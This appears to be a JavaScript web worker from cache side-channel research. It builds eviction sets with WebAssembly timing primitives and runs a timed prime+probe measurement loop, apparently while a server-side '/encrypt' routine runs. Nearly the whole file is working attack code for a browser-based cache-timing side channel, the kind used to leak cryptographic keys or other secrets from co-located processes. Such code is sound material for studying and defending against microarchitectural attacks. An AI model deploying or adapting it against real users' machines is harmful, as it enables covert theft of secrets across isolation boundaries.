function encrypt() {
    console.log("calling encrypt");
    fetch("/encrypt", { method: "POST" }).then(() =>
        console.log("encrypt done!"),
    );
}

let memDataView = null;

function getTime() {
    return memDataView.getBigUint64(256, true);
}

function wait(n) {
  for(let i = 0; i < n; i++) {}
}

class EvictionSetGenerator {
    constructor(dataView, config) {
        this.config = config;
        this.candidatePoolPtr = config.page_size;
        this.candidatePoolSize = config.num_candidates * config.page_size;
        this.dataView = dataView;
    }
    JSTimedMiss(probe, evsetPtr) {
        var data, t1, t0;
        // access probe
        data = this.dataView.getUint32(0, probe, true);
        // traverse linked list
        while(evsetPtr) {
            evsetPtr = this.dataView.getUint32(0, evsetPtr, true);
        }
        // time access
        t0 = getTime()
        data = this.dataView.getUint32(0, probe, true);
        t1 = getTime();
        return t1 - t0;
    }
    JSTimedHit(probe) {
        // time access
        var data, t1, t0;
        data = this.dataView.getUint32(0, probe, true);
        t0 = getTime()
        data = this.dataView.getUint32(0, probe, true);
        t1 = getTime();
        return t1 - t0;
    }
    JSTimedAccess(probe) {
        var data, t1, t0;
        t0 = getTime()
        data = this.dataView.getUint32(0, probe, true);
        t1 = getTime();
        return t1 - t0;
    }
    measureTimedMiss(timed_miss, probe, evsetPtr) {
        const miss_func = timed_miss ? timed_miss : this.JSTimedMiss;
        let t = 0;
        for (let i = 0; i < this.config.num_measurements; i++) {
            t += Number(miss_func(probe, evsetPtr));
        }
        return t / this.config.num_measurements;
    }
    setupLinkedList(indices) {
        if (indices.length == 0) {
            return;
        }
        let pre = indices[0];
        for (let i = 1; i < indices.length; i++) {
            this.dataView.setUint32(pre, indices[i], true);
            pre = indices[i];
        }
        this.dataView.setUint32(pre, 0, true);
        return indices[0];
    };
    getPageOffset(target) {
        target = target & ((this.config.page_size - 1) >>> 0);
        // to avoid unaligned memory access
        // target = target & ((~(4-1)) >>> 0)
        return target ? target : 0;
    }
    generateCandidateSet(target, timed_miss) {
        const pageOffset = this.getPageOffset(target);
        let evicted = false;
        let indices = [];
        do {
            indices = new Array(this.config.num_candidates);
            for (let i = 0; i < indices.length; i++) indices[i] = this.candidatePoolPtr + (i * this.config.page_size) + pageOffset;
            for (let i = 0; i < indices.length; i++) {
                const to_swap = Math.floor(Math.random() * (indices.length));
                const tmp = indices[i];
                indices[i] = indices[to_swap];
                indices[to_swap] = tmp;
            }
            this.setupLinkedList(indices);
            if (target) {
                let t = this.measureTimedMiss(timed_miss, target, indices[0]);
                evicted = this.config.threshold < t;
                if(!evicted) {
                    console.log(".")
                }
            }
        } while (target && !evicted);
        for (let i = 0; i < indices.length; i++) indices[i] -= pageOffset;
        return indices;
    };
    relinkChunk(evset, removedChunks) {
        const chunk = removedChunks.pop()
        // point last evset element to first chunk element
        this.dataView.setUint32(evset[evset.length-1], chunk[0], true);
        evset = evset.concat(chunk); 
        return [evset, removedChunks]
    }
    unlinkChunk(evset, removedChunks, nchunks, chunk_idx) {
        nchunks = evset.length < nchunks ? evset.length : nchunks;
        const chunkSize = evset.length / nchunks;
        const isLastChunk = chunk_idx == (nchunks - 1);
        const chunkHead = nchunks * chunk_idx;
        const thisChunkSize = isLastChunk ? evset.length - chunkHead : chunkSize;
        const newChunk = evset.splice(chunkHead, thisChunkSize);
        removedChunks = removedChunks.concat(newChunk);
        if(chunk_idx != 0 ) {
            this.dataView.setUint32(evset[chunkHead - 1], isLastChunk ? 0 : evset[chunkHead + chunkSize], true);
        }
        this.dataView.setUint32(newChunk[newChunk.length - 1], 0, true);
        return [evset, removedChunks]
    }
    reduceToEvictionSet(timed_miss, candidates, probe) {
        const pageOffset = this.getPageOffset(probe);
        let evset = Array.from(candidates);
        for(let i = 0; i < evset.length; i++) evset[i] += pageOffset;
        let removedChunks = [];
        this.setupLinkedList(evset);
        let backtrackCounter = 0;
        let level = 0;
        const nchunks = this.config.associativity + 1;
        for (let i = 0; i < evset.length; i++) {
            const to_swap = Math.floor(Math.random() * (evset.length - 1));
            const tmp = evset[i];
            evset[i] = evset[to_swap];
            evset[to_swap] = tmp;
        }
        while(evset.length > this.config.associativity) {
            let found = false;
            let i = 0;
            for(; i < nchunks && !found; i++) {
                [evset, removedChunks] = this.unlinkChunk(evset, removedChunks, nchunks, i);
                let t = this.measureTimedMiss(timed_miss, probe, evset[0]);
                if(t < this.config.threshold) {
                    [evset, removedChunks] = this.relinkChunk(evset, removedChunks);
                } else {
                    console.log("-");
                    level++;
                    found = true;
                }
            }
            if(!found) {
                if(level && (!this.config.num_backtracks || backtrackCounter < this.config.num_backtracks)) {
                    backtrackCounter++;
                    [evset, removedChunks] = this.relinkChunk(evset, removedChunks);
                    console.log("<");
                    level--;
                    if(removedChunks.length == 0) {
                        console.log("|")
                        return evset;
                    }
                } else {
                    while(removedChunks.length > 0) {
                        [evset, removedChunks] = this.relinkChunk(evset, removedChunks);
                    }
                    console.log("!");
                    return evset;
                }
            }
        }
        return evset;
    }
    generateConflictSet(evsets) {
        let set = new Set(evsets[0]);
        for(let i = 1; i < evsets.length; i++) {
            for(let j = 0; j < evsets[i].length; j++) {
                set.add(evsets[i][j]);
            }
        }
        const conflictSet = Array.from(set);
        this.setupLinkedList(conflictSet);
        return conflictSet;
    }
}

self.onmessage = async (event) => {
    const { memory, utils, config } = event.data;
    const wasmUtils = new WebAssembly.Instance(utils, {
        env: {
            memory: memory,
        },
    });
    memDataView = new DataView(memory.buffer);
    const timed_miss = wasmUtils.exports.timed_miss;
    const timed_access = wasmUtils.exports.timed_access;
    const evict = wasmUtils.exports.evict;
    const timed_hit = wasmUtils.exports.timed_hit;

    const evGenerator = new EvictionSetGenerator(memDataView, config);
    console.log("evGenerator created")
    const candidates = evGenerator.generateCandidateSet(config.page_size, timed_miss);
    console.log("candidate set created with size: ", candidates.length);

    // const evsets = new Array(config.probe.length);
    // for(let i = 0; i < evsets.length; i++) {
    //     do {
    //         evsets[i] = evGenerator.reduceToEvictionSet(timed_miss, candidates, config.probe[i])
    //     } while(evsets[i].length > 12);
    //     console.log("evset[", i, "] created with size: ", evsets[i].length);
    // }
    // const conflictSet = evGenerator.generateConflictSet(evsets);
    // console.log(conflictSet)
    // console.log("conflict set created with size: ", conflictSet.length);
    // const evset = evGenerator.reduceToEvictionSet(timed_miss, candidates, config.page_size);
    const total_num_results = config.time_slots * config.probe.length;
    const results = new Uint32Array(total_num_results);
    // encrypt();

    for(let i = 0; i < total_num_results; i += config.probe.length) {
        const startTime = wasmUtils.exports.get_time()
        for(let j = 0; j < config.probe.length; j++) {
            const t = timed_miss(config.page_size, candidates[0]);
            // const t = timed_hit(config.page_size);
            // const t = evGenerator.JSTimedMiss(config.page_size, candidates[0])
            results[i + j] = Number(t);
            // results[i + j] = evGenerator.measureTimedMiss(timed_miss, config.probe[0], candidates[0]);
            // results[i + j] = Number(timed_hit(config.probe[0]))
        }
        // evict(conflictSet[0]);
        do {
            wait(config.wait_cycles);
        } while (wasmUtils.exports.get_time() - startTime < BigInt(config.time_slot_size));
    }
    let numEvicted = 0
    for(let i = 0; i < results.length; i++) {
        if(results[i] > config.threshold) numEvicted++;
    }
    console.log("numEvicted:", numEvicted)
    console.log("percentage evicted:", numEvicted / results.length)
    self.postMessage(results);
};
